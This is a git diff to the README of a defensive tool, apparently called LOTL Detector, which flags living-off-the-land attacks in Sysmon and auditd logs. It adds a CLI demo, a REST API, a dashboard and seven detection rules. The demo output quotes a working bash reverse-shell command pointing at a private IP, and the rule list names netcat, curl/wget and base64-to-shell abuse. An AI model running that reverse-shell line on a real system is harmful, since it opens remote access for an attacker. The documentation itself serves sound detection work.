@@ -24,18 +24,105 @@ System Logs (Sysmon, auditd, etc.)
 
 ## Project Status
 
-**Phase 1: Foundation** (In Progress)
+**Phase 1: Foundation** ✅ (Complete)
 - [x] Rule schema definition
 - [x] Rule loader with validation
 - [x] Base collector interface
-- [x] Unit tests
-- [ ] Windows collector
-- [ ] Linux collector
-- [ ] Detection engine
-- [ ] API server
-- [ ] Dashboard UI
+- [x] Unit tests (126 tests passing)
+- [x] Windows collector (Sysmon Event ID 1)
+- [x] Linux collector (auditd EXECVE logs)
+- [x] Detection engine with scoring
+- [x] API server (Flask REST API)
+- [x] Dashboard UI (Web-based)
+- [x] CLI demonstration tool
 
 ## Quick Start
+
+### CLI Demo Tool
+
+The fastest way to see LOTL Detector in action is using the CLI demonstration tool:
+
+```bash
+# Run demo mode with sample fixtures
+python demo_detector.py --demo
+
+# List all detection rules
+python demo_detector.py --list-rules
+
+# Scan specific log files
+python demo_detector.py --platform linux --log-path /var/log/audit/audit.log
+
+# Scan with verbose output and export results
+python demo_detector.py --platform windows --log-path C:\Windows\System32\winevt\Logs\ --export alerts.json --verbose
+```
+
+#### Demo Mode Output Example
+```
+LOTL DETECTOR - DEMO MODE
+=========================
+
+Loading rules... ✓ 7 rules loaded
+Initializing detection engine... ✓ Ready
+Initializing collectors... ✓ Windows, Linux
+
+Scanning Linux logs...
+├─ Parsed 1 events
+└─ Generated 1 alert(s)
+
+ALERTS DETECTED
+===============
+
+[CRITICAL] Bash/Netcat Reverse Shell (Score: 140/150)
+  Process: bash
+  Command: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+  MITRE: T1059.004, T1071.001
+  Response: IMMEDIATE: Isolate the affected system
+
+STATISTICS
+==========
+Events processed: 4
+Alerts generated: 3
+Critical: 1 | High: 2 | Medium: 0 | Low: 0
+Database: 3 alerts saved to lotl_detector.db
+```
+
+#### CLI Options
+
+```
+usage: demo_detector.py [-h] [--demo | --list-rules] [--platform {windows,linux,both}]
+                        [--log-path LOG_PATH] [--rules-dir RULES_DIR]
+                        [--database DATABASE] [--export EXPORT] [--verbose]
+
+Options:
+  --demo                Run demo mode using sample fixtures
+  --list-rules          List all loaded detection rules
+  --platform            Platform to scan: windows, linux, or both (default: both)
+  --log-path            Path to log file or directory
+  --rules-dir           Rules directory (default: rules/)
+  --database            Database file (default: lotl_detector.db)
+  --export              Export alerts to file (JSON or CSV)
+  --verbose             Show detailed output
+```
+
+### Web Dashboard
+
+Start the REST API server and access the web dashboard:
+
+```bash
+# Start API server
+python run.py --host 0.0.0.0 --port 5000
+
+# Open dashboard in browser
+open dashboard/index.html
+# Or visit: http://localhost:5000 (if served)
+```
+
+The dashboard provides:
+- Real-time alert monitoring
+- Filtering by severity, platform, score, and time range
+- Interactive charts and statistics
+- Detailed alert inspection
+- Export to JSON/CSV
 
 ### Setup
 ```bash
@@ -91,6 +178,86 @@ loader.load_rules_directory("rules")
 rule = loader.get_rule_by_id("WIN-001")
 ```
 
+## REST API
+
+The framework includes a Flask-based REST API for programmatic access and integration.
+
+### Starting the API Server
+
+```bash
+python run.py --host 0.0.0.0 --port 5000 --log-level INFO
+```
+
+### API Endpoints
+
+#### Health Check
+```bash
+GET /api/health
+```
+
+#### Get Alerts
+```bash
+# Get all alerts
+GET /api/alerts
+
+# Filter by severity
+GET /api/alerts?severity=critical
+
+# Filter by platform
+GET /api/alerts?platform=linux
+
+# Filter by minimum score
+GET /api/alerts?min_score=100
+
+# Limit results
+GET /api/alerts?limit=50
+```
+
+#### Get Single Alert
+```bash
+GET /api/alerts/{alert_id}
+```
+
+#### Get Statistics
+```bash
+GET /api/stats
+```
+
+#### Get Rules
+```bash
+GET /api/rules
+```
+
+#### Scan Logs
+```bash
+POST /api/scan
+Content-Type: application/json
+
+{
+  "platform": "linux",
+  "log_path": "/var/log/audit/audit.log"
+}
+```
+
+### Example API Usage
+
+```python
+import requests
+
+# Get all critical alerts
+response = requests.get('http://localhost:5000/api/alerts?severity=critical')
+alerts = response.json()
+
+# Scan logs
+scan_data = {
+    'platform': 'linux',
+    'log_path': '/var/log/audit/audit.log'
+}
+response = requests.post('http://localhost:5000/api/scan', json=scan_data)
+result = response.json()
+print(f"Generated {result['alerts_generated']} alerts")
+```
+
 ## Development
 
 ### Team Structure
@@ -113,16 +280,35 @@ rule = loader.get_rule_by_id("WIN-001")
 
 ## Detection Techniques
 
-Currently detecting:
-- **WIN-001:** Certutil download abuse
+### Currently Implemented (7 Rules)
 
-Planned:
+**Windows (1 rule):**
+- **WIN-001:** Certutil download abuse (High severity)
+
+**Linux (6 rules):**
+- **LNX-001:** Curl/Wget downloading suspicious scripts (High severity)
+- **LNX-002:** Bash/Netcat reverse shell (Critical severity)
+- **LNX-003:** Crontab modification for persistence (High severity)
+- **LNX-004:** SSH with suspicious flags/tunneling (Medium severity)
+- **LNX-005:** Base64 decode piped to shell (High severity)
+- **LNX-006:** Netcat listening for connections (High severity)
+
+### Detection Features
+
+- **Rule-based matching:** YAML-defined detection rules with regex support
+- **Risk scoring:** 0-150 scale based on severity, detection criteria, and MITRE techniques
+- **Whitelisting:** Per-rule whitelists for users, parent processes, and paths
+- **MITRE ATT&CK mapping:** Each rule mapped to relevant tactics and techniques
+- **Cross-platform:** Unified event model across Windows and Linux
+
+### Planned Expansions
+
 - PowerShell encoded commands
 - WMI lateral movement
 - Regsvr32 DLL execution
 - BITSAdmin abuse
-- Linux reverse shells
-- Cron persistence
+- macOS unified log support
+- Advanced behavioral correlation
 
 ## Contributing
 
